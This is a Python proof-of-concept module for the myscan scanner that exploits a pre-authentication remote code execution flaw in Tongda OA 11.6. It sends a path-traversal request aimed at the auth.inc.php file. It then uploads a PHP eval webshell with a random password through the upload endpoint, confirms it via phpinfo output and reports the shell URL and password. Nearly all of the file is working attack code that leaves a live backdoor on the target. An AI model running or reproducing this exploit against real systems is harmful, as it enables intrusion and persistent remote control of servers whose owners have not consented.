# !/usr/bin/env python3
# @Time    : 2020/8/18
# @Author  : caicai
# @File    : poc_tongda_oa_rce_2020.py


'''

'''

from myscan.lib.helper.request import request
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.config import scan_set
from myscan.lib.core.common import get_random_str
import re


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "tongda oa rce"
        self.vulmsg = "通达OA11.6 preauth RCE "
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        self.parser = dictdata_parser(self.dictdata)
        pwd = get_random_str(10).lower()
        filename = get_random_str(10).lower() + ".php"
        payload = "<?php eval($_REQUEST['{}']);phpinfo();?>".format(pwd)

        req = {
            "url": self.url + "module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php",
            "method": "GET",
            "headers": {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"},
            "verify": False,
            "timeout": 10,
        }
        r = request(**req)
        req["url"] = self.url + "general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=../../../"
        files = {'FILE1': (filename, payload)}
        req["files"] = files
        req["method"] = "POST"
        r = request(**req)
        req_ = {
            "url": self.url + "_{}".format(filename),
            "method": "GET",
            "headers": {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"},
            "verify": False,
            "timeout": 10,
        }
        r_ = request(**req_)
        if r_ is not None and re.search(b"PHP Extension|<title>phpinfo\(\)</title>", r_.content,re.I):
            self.result.append({
                "name": self.name,
                "url": self.url,
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "webshell": req_["url"],
                    "pwd": pwd,
                    "request": self.parser.getrequestraw(),
                    "response": self.parser.getresponseraw(),
                }
            })
